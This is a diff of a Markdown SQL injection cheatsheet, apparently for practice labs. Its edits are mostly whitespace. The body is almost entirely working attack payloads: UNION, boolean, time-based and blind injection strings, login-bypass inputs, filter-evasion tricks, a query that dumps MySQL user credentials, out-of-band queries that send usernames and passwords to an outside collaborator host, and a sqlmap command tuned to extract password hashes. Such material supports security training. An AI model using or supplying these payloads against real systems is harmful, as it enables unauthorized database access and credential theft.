@@ -1,6 +1,7 @@
 # SQL INJECTION CHEATSHEET + LABS
 
 ## Index
+
 - [Key Terms](#key-terms)
 - [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
 - [Database Version](#database-type-version)
@@ -50,6 +51,7 @@
 <br>
 
 #### DATABAE-TYPE-VERSION
+
 ``` sql
 SELECT version()  --> PostgreSQL 
 SELECT @@version  --> Microsoft, MySQL
@@ -58,6 +60,7 @@ SELECT BANNER FROM v$version --> Oracle
 ```
 
 #### DATABASE CONTENT
+
 ```sql
 --- ORACLE (no information schema)
 SELECT * FROM all_tables
@@ -82,7 +85,9 @@ SELECT column_name from information_schema.columns where table_schema='foo' and 
 SELECT 1,group_concat(User,0x3a,Password),3 from mysql.user --
 
 ```
+
 #### UNION BASED
+
 ```sql
 ' UNION SELECT NULL,NULL,NULL --  null is used because it must return the same data type
 ' UNION SELECT 1,2,3 --
@@ -93,6 +98,7 @@ SELECT 1,group_concat(User,0x3a,Password),3 from mysql.user --
 ```
 
 #### BOOLEAN BASED
+
 ```sql
 http://example.com/item?id=1 AND 1=1 -- except normal req
 http://example.com/item?id=1 AND 1=2 -- except error 
@@ -101,6 +107,7 @@ http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- expect error
 ```
 
 #### TIME BASED
+
 ```sql
 pg_sleep(10) --> PostgreSQL
 dbms_pipe.receive_message(('a'),10) --> Oracle
@@ -111,6 +118,7 @@ SLEEP(10)  --> MySQL
 ```
 
 #### BLIND BASED
+
 ```sql
 -- oracle --
 foo'||(select '' from dual)||'  -- no error
@@ -133,6 +141,7 @@ SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN
 ```
 
 #### OUT-OF-BAND
+
 ```sql
 -- SQLI + XXE -> CHECK DNS CALLBACK
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<COLLAB_DOMAIN>/"> %remote;]><root>&remote;</root>'),'/l') FROM dual;
@@ -148,6 +157,7 @@ SELECT username, password INTO OUTFILE '\\\\<COLLAB_DOMAIN>\\<FILENAME>';
 ```
 
 #### BYPASSING-SQL-SINTAX
+
 ```sql
 -- BYPASSIN  EQUALS --
 
@@ -170,7 +180,8 @@ WHERE --> HAVING
 ```
 
 #### WAF-AUTH-BYPASS
-```sql
+
+```bash
 administrator' --
 administrator' #
 administrator'/*
@@ -253,15 +264,10 @@ or 1=1/*
 ```
 
 #### SQL MAP
-``` 
+
+```
 sqlmap -r <REQUEST-FROM-BURP>
 
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 
 ```
-
-
-
-
-
-
